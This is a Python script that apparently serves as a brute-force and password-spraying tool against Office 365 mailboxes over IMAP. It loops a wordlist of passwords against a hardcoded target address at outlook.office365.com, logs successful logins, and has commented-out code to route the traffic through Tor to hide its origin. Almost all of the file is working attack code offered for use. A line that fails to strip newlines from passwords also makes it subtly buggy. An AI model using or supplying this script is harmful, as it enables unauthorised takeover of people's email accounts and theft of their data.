#!/usr/bin/env python
# Author: xakepnz
# Description: Simple O365 IMAP Brute Force Script, can be used with local Tor proxy, single/spray attacks.
################################################################################################
# Imports:
################################################################################################

import socks
import socket
import imaplib
import logging

################################################################################################
# Attempt to login:
################################################################################################

def attempt_imap_login(username, password):
    """
    Takes:
        username - Username to try.
        password - Password to try.
    Does:
        Attempts to login via IMAP to Office 365 using the provided credentials.
    """
    
    try:
        # Optional verbose message attempts:
        #logging.info('Attempting username: {} password: {}..'.format(username,password))
        M = imaplib.IMAP4_SSL('outlook.office365.com')
        rv, data = M.login(username, password)
        if rv:
            logging.info('Login Success: {} with password: {}'.format(username,password))
    except imaplib.IMAP4.error:
        # Optional verbose message for failures:
        logging.error('Login Failed for: {} with password: {}'.format(username,password))
        pass
    except KeyboardInterrupt:
        exit(0)

################################################################################################
# Passwords:
################################################################################################

def read_passwords(password_file):
    """
    Takes:
        password_file - A plaintext file containing multi-line passwords to use for attack.
    Returns:
        passwords     - List of passwords to use. 
    """

    passwords = []

    with open(password_file) as r:
        lines = r.readlines()

    for l_ in lines:
        l_.replace('\n','')
        passwords.append(l_)
    return passwords

################################################################################################
# Main:
################################################################################################

if __name__ == '__main__':
    # Set logging level:
    logging.getLogger().setLevel(logging.DEBUG)
    logging.basicConfig(
        format='%(asctime)s - %(levelname)s - %(message)s',
        level=logging.INFO,
        datefmt='%Y-%m-%d %H:%M:%S')

    # Username to attempt to brute force:
    username = 'first.last@somedomainhere.com'

    # Read in a list of passwords from a text file:
    passwords = read_passwords('/home/xakep/wordlists/big.txt')

    # Optional route via Local Tor proxy:
    # socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'localhost',9050,True)
    # socket.socket = socks.socksocket
    # socket.setdefaulttimeout(5)

    # Start attack:
    for word in passwords:
        attempt_imap_login(username, word)
